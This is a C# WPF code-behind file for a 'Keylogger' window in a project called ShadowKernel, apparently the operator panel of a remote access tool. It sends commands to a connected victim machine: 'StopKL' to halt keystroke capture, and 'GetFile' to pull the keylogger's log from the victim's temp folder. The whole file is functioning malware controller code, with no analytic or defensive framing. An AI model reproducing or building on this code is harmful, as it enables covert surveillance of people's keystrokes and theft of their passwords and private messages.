using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using static ShadowKernel.Classes.Server;

namespace ShadowKernel.userControls
{
    /// <summary>
    /// Логика взаимодействия для Keylogger.xaml
    /// </summary>
    public partial class Keylogger : Window
    {
        public int ConnectionID { get; set; }
        public bool Update { get; set; }
        public Keylogger()
        {
            InitializeComponent();
            Update = true;
        }

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            Update = false;
            MainServer.Send(ConnectionID, Encoding.UTF8.GetBytes("StopKL"));
        }

        private void Get_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                MainServer.Send(ConnectionID, Encoding.UTF8.GetBytes("GetFile{[" + System.IO.Path.GetTempPath() + "KeyLoggerLogs" + "E<E" + ".log"+ "]}"));
            }
            catch
            {

            }
        }
    }
}
